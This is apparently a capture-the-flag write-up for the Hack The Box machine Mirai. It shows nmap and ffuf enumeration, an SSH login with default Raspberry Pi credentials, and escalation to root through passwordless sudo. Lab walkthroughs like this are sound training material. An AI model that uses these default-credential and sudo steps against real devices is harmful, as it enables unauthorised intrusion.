![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e4b58384-4838-44ae-bfbc-0e41ed94ed48)

first enumeration with nmap

```
# Nmap 7.93 scan initiated Fri Jun  2 01:02:48 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 22,53,80,1738,32400,32469 -Pn 10.10.10.48
Nmap scan report for 10.10.10.48
Host is up (0.15s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 aaef5ce08e86978247ff4ae5401890c5 (DSA)
|   2048 e8c19dc543abfe61233bd7e4af9b7418 (RSA)
|   256 b6a07838d0c810948b44b2eaa017422b (ECDSA)
|_  256 4d6840f720c4e552807a4438b8a2a752 (ED25519)
53/tcp    open  domain  dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp    open  http    lighttpd 1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: lighttpd/1.4.35
1738/tcp  open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
32400/tcp open  http    Plex Media Server httpd
|_http-title: Unauthorized
|_http-favicon: Plex
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-cors: HEAD GET POST PUT DELETE OPTIONS
32469/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun  2 01:03:12 2023 -- 1 IP address (1 host up) scanned in 24.87 seconds
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/de28261a-ac9b-4fbc-8282-5ee2ec73b4a9)

noticed a web server on port 80, opening it on a browser, there was no web page to display. let's fuzz.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Mirai]
└─$ ffuf -u "http://10.10.10.48/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 403,404,500 -e .bak,.php,.txt,.tar,.zip -ic -fs 91,101

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.48/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : .bak .php .txt .tar .zip 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 91,101
 :: Filter           : Response status: 403,404,500
________________________________________________

_framework/blazor.webassembly.js [Status: 200, Size: 61, Words: 10, Lines: 2, Duration: 204ms]
admin                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 160ms]
swfobject.js            [Status: 200, Size: 61, Words: 10, Lines: 2, Duration: 165ms]
:: Progress: [28278/28278] :: Job [1/1] :: 246 req/sec :: Duration: [0:03:01] :: Errors: 82 ::
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e6cd0a3c-e8a8-4a8b-8004-e75842a22994)

navigating to the admin dir, we can see it is running a `PI-Hole` service.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/adc53ccf-aa20-4672-8d20-cfc0841f0851)

checking the login page, tried to login with default creds, none worked 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/1af209e8-3cd6-4c50-a535-f7ab32a06785)

checked google for `pihole` default password, and got `pi:raspberry`. let's try login ssh using this creds.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Mirai]
└─$ ssh pi@mirai.htb          
The authenticity of host 'mirai.htb (10.10.10.48)' can't be established.
ED25519 key fingerprint is SHA256:TL7joF/Kz3rDLVFgQ1qkyXTnVQBTYrV44Y2oXyjOa60.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:101: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'mirai.htb' (ED25519) to the list of known hosts.
pi@mirai.htb's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun  2 08:03:17 2023 from 10.10.14.16

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~$ id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),117(i2c),998(gpio),999(spi)
pi@raspberrypi:~$
```
bull's eye we logged in ssh.


## Privilege Escalation

```
pi@raspberrypi:~$ sudo -l
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
pi@raspberrypi:~$ sudo su
root@raspberrypi:/home/pi# cd
root@raspberrypi:~# 
```
checking sudo privs, we can see we are allowed to run sudo without password `sudo su` got use a root shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/cdcb9b9a-b229-4d95-8f69-9309a94865ad)

and we are through 😜 had fun yeah?
